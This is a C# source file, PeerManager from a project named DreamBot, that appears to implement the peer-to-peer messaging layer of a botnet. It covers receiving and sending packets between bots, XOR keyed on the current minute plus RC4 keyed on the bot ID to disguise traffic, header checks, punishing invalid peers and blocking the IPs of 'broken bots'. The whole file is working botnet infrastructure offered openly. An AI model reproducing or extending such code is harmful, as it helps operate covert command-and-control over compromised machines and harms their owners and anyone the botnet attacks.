using System;
using System.Net;
using DreamBot.Crypto;
using DreamBot.Network.Comunication;
using DreamBot.Network.Protocol.Messages;
using DreamBot.Utils;
using DreamBot.Workers;

namespace DreamBot.Network.Protocol.Peers
{
    public class PeerManager
    {
        private readonly BotIdentifier _botId;
        private readonly IWorkScheduler _worker;
        private readonly ReplyWaitManager _waitingForReply;
        private readonly ComunicationManager _comunicationManager;

        public EventHandler<PackageReceivedEventArgs<BotHeader>> BotPackageReceivedEventArgs;
        private readonly PeerList _peerList;

        public PeerManager(ComunicationManager comunicationManager, PeerList peerList, IWorkScheduler worker, BotIdentifier botId)
        {
            _comunicationManager = comunicationManager;
            _comunicationManager.PackageReceivedEventArgs += PackageReceivedEventArgs;
            _worker = worker;
            _botId = botId;
            _waitingForReply = new ReplyWaitManager(_comunicationManager);

            _worker.QueueForever(PurgeTimeouts, TimeSpan.FromSeconds(60));
            _peerList = peerList;

            _peerList.BrokenBotDetected += BrokenBotDetected;
        }

        private void BrokenBotDetected(object sender, BrokenBotDetectedEventArgs e)
        {
            Logger.Verbose(3, "Broken Bot detected at {0}", e.PeerInfo);
            _comunicationManager.BlockIp(e.PeerInfo.EndPoint.Address);
        }

        private void PackageReceivedEventArgs(object sender, PackageReceivedEventArgs<IPEndPoint> e)
        {
            var data = e.Payload;

            var now = new TimeSpan(DateTime.UtcNow.Ticks);
            var minutes = now.TotalMilliseconds / (1000 * 60);
            var xor = new Mod2(BitConverter.GetBytes(minutes));
            xor.Decrypt(data);

            var rc4 = new Rc4(_botId.ToByteArray());
            rc4.Decrypt(data);

            var botHeader = BotHeader.Decode(data);
            if(!IsValidHeader(botHeader))
            {
                _peerList.Punish(botHeader.BotId);
                return;
            }

            botHeader.EndPoint = e.Proto;
            _peerList.UpdatePeer(botHeader.BotId);
            Events.Raise(BotPackageReceivedEventArgs, this, new PackageReceivedEventArgs<BotHeader>(botHeader, data));
        }

        private bool IsValidHeader(BotHeader botHeader)
        {
            return !(botHeader.Padding < 2 || botHeader.Padding > 128
                    || botHeader.MessageId < 0 || botHeader.MessageId > 4
                    || botHeader.Ttl < 2 || botHeader.Ttl > 6);
        }

        private void PurgeTimeouts()
        {
            _waitingForReply.PurgeTimeouts();
        }

        public void Send(short messageId, ulong correlationId, short ttl, byte[] payload, BotIdentifier botId)
        {
            if (!_peerList.IsRegisteredBot(botId)) return;

            var padding = RandomUtils.NextPadding();
            var header = new BotHeader {
                CorrelationId = correlationId == 0 ? RandomUtils.NextCorrelationId() : correlationId, 
                BotId = botId, 
                MessageId = messageId, 
                PayloadSize = (short) payload.Length, 
                Padding = (short) padding.Length, 
                Ttl = ttl == 0 ? RandomUtils.NextTtl() : ttl
            };

            var message = BufferUtils.Concat(header.Encode(), padding);

            var rc4 = new Rc4(botId.ToByteArray());
            rc4.Encrypt(message);

            var now = new TimeSpan(DateTime.UtcNow.Ticks);
            var minutes = now.TotalMilliseconds / (1000 * 60);
            var xor = new Mod2(BitConverter.GetBytes(minutes));
            xor.Decrypt(message);

            var endPoint = _peerList[botId];

            Logger.Verbose(3, "{0}@{1} {2}", header.BotId, endPoint, header.CorrelationId);
            _comunicationManager.Send(endPoint, message);
            if (correlationId == 0)
                _waitingForReply.Add(new Package(endPoint, message), correlationId);
        }
    }
}